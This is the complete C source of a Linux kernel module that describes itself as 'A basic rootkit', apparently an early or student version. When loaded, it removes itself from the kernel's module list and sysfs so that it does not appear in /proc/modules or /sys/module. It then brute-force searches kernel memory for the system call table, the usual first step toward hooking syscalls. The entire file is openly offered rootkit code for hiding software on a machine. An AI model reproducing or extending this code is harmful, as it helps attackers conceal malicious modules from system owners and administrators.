#include <linux/module.h> // Included for all kernel modules
#include <linux/kernel.h> // Included for KERN_INFO
#include <linux/init.h> // Included for __init and __exit macros
#include <linux/syscalls.h> // The syscall table and __NR_<syscall_name> misc

 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Richard <richard.kavanagh7@mail.dcu.ie>");
MODULE_DESCRIPTION("A basic rootkit.");


unsigned long **sys_call_table;

static unsigned long **get_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    printk("Beginning brute force seach for Syscall table at location: %lx\n", offset);

    while (offset < ULLONG_MAX) {
      
        sct = (unsigned long **)offset;
        /* Searching for bit pattern that matches sct[__NR_close] */
        if (sct[__NR_close] == (unsigned long *) sys_close) {
            printk("Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}


static int __init hidden_init(void)
{

    printk(KERN_INFO "Starting up module.\n");

    /* Hide the module from proc/modules, Sys/modules tracking */
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    if(!(sys_call_table = get_sys_call_table())) {
        printk(KERN_INFO "Unable to locate Syscall table, removing module");
        // Non-zero return means that the module couldn't be loaded.
        return -1;
    }
    return 0; 
}
 
static void __exit hidden_cleanup(void)
{
    printk(KERN_INFO "Cleaning up module.\n");
}
 
module_init(hidden_init);
module_exit(hidden_cleanup);
